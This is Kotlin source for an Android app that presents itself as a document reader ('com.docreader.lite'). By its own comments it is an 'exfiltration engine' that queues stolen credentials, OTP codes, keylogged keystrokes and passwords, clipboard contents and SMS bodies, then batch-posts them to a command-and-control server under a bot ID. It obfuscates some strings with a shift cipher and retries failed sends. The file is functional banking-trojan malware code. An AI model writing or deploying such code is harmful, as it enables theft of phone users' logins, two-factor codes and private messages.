package com.docreader.lite.reader

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.TimeUnit

/**
 * Exfiltration engine — collects all stolen data and batch-sends to C2.
 *
 * Data types:
 *   - Credentials (overlay captures, keylogged passwords)
 *   - OTP codes (SMS, notification, overlay prompt)
 *   - Keystrokes (full keylog stream from A11y)
 *   - Clipboard content
 *   - SMS messages (full body)
 *   - Events (metadata: clicks, focuses, screen text samples)
 *
 * Batch strategy: accumulate 5+ items OR every 20s timer, whichever first.
 * On send failure: re-queue (retry on next flush).
 */
object Exfil {

    private const val K = 13
    private fun d(a: IntArray) = String(CharArray(a.size) { (a[it] - K).toChar() })

    // "application/json"
    private val _ct = intArrayOf(110,125,125,121,118,112,110,129,118,124,123,60,119,128,124,123)
    // "X-Bot-Id"
    private val _hk = intArrayOf(101,58,79,124,129,58,86,113)

    private val queue = ConcurrentLinkedQueue<JSONObject>()
    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private var flushJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun credential(app: String, field: String, value: String) {
        enqueue(JSONObject().apply {
            put("type", "credential")
            put("app", app)
            put("field", field)
            put("value", value)
            put("ts", System.currentTimeMillis())
        })
    }

    fun otp(source: String, code: String, app: String) {
        enqueue(JSONObject().apply {
            put("type", "otp")
            put("source", source)
            put("code", code)
            put("app", app)
            put("ts", System.currentTimeMillis())
        })
    }

    fun keystroke(app: String, text: String, isPassword: Boolean) {
        enqueue(JSONObject().apply {
            put("type", "keystroke")
            put("app", app)
            put("text", text)
            put("is_password", isPassword)
            put("ts", System.currentTimeMillis())
        })
    }

    fun clipboard(content: String) {
        enqueue(JSONObject().apply {
            put("type", "clipboard")
            put("content", content)
            put("ts", System.currentTimeMillis())
        })
    }

    fun sms(sender: String, body: String) {
        enqueue(JSONObject().apply {
            put("type", "sms")
            put("sender", sender)
            put("body", body)
            put("ts", System.currentTimeMillis())
        })
    }

    fun event(name: String, vararg pairs: Pair<String, Any>) {
        enqueue(JSONObject().apply {
            put("type", "event")
            put("name", name)
            pairs.forEach { put(it.first, it.second) }
            put("ts", System.currentTimeMillis())
        })
    }

    private fun enqueue(item: JSONObject) {
        queue.add(item)
        // Auto-flush at threshold
        if (queue.size >= 5) {
            flush()
        }
    }

    fun startPeriodicFlush(intervalMs: Long = 20_000L) {
        flushJob?.cancel()
        flushJob = scope.launch {
            while (isActive) {
                delay(intervalMs)
                flush()
            }
        }
    }

    fun stopFlush() {
        flushJob?.cancel()
        flushJob = null
    }

    fun flush() {
        if (queue.isEmpty()) return

        val batch = mutableListOf<JSONObject>()
        while (queue.isNotEmpty() && batch.size < 30) {
            queue.poll()?.let { batch.add(it) }
        }
        if (batch.isEmpty()) return

        val payload = JSONObject().apply {
            put("bot_id", android.os.Build.MODEL + "_" + android.os.Build.SERIAL)
            put("pkg", "com.docreader.lite")
            put("batch", JSONArray(batch))
            put("ts", System.currentTimeMillis())
        }

        scope.launch {
            try {
                val url = C2.exfilUrl()
                val body = payload.toString().toRequestBody(d(_ct).toMediaType())
                val req = Request.Builder()
                    .url(url)
                    .post(body)
                    .header(d(_hk), android.os.Build.MODEL)
                    .build()
                val resp = client.newCall(req).execute()
                resp.close()
            } catch (_: Exception) {
                // Re-queue on failure
                batch.forEach { queue.add(it) }
            }
        }
    }

    fun queueSize() = queue.size
}
